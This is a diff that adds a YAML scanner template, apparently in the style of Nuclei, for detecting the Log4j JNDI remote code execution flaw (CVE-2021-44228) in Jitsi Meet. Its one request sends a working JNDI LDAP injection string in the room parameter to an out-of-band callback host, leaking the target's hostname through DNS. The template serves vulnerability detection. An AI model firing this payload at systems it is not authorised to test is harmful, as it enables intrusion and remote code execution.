@@ -1,0 +1,30 @@
+id: jitsi-meet-log4j-rce
+brief:
+    title: Jitsi Meet - Remote Code Execution (Apache Log4j)
+    by: shaikhyaser
+    level: critical
+    about: Jitsi Meet is susceptible to Log4j JNDI remote code execution. Jitsi is a collection of free and open-source multiplatform voice, video conferencing and instant messaging applications for the Web p...
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - jitsi
+        - oast
+        - kev
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/http-bind?room=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}'
+      head:
+        Origin: '{{RootURL}}'
+        Referer: '{{RootURL}}'
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
